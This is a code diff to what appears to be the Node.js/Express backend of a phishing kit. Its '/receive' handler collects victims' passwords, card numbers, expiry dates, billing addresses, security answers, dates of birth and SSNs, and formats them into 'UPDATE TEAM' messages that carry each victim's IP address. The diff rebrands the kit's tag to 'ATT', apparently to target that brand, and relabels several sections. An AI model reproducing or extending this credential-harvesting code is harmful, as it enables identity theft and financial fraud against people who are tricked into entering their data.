@@ -117,8 +117,8 @@ app.post('/receive', async (req, res) => {
   const myObjects = Object.keys(myObject);
 	console.log(myObjects);
 
-  if (myObjects.includes('Password')) {
-    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
+  if (myObjects.includes('password')) {
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
                `👤 ${myObject['visitor']}\n\n`;
 
     for (const key of myObjects) {
@@ -147,7 +147,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (myObjects.includes('Expiry-Date') || myObjects.includes('Card-Number') || myObjects.includes('Billing Address')) {
-    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
@@ -164,8 +164,8 @@ res.send('dn');
   }
   
   if (myObjects.includes('message')) {
-    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
-               `👤 SECURITY Q&A\n\n`;
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -181,8 +181,8 @@ res.send('dn');
   }
 
   if (myObjects.includes('DOB') || myObjects.includes('SSN') || myObjects.includes('State')) {
-    message += `✅ UPDATE TEAM | ARROWHE4DCU | USER_${ipAddress}\n\n` +
-               `👤 CONTACT INFO\n\n`;
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
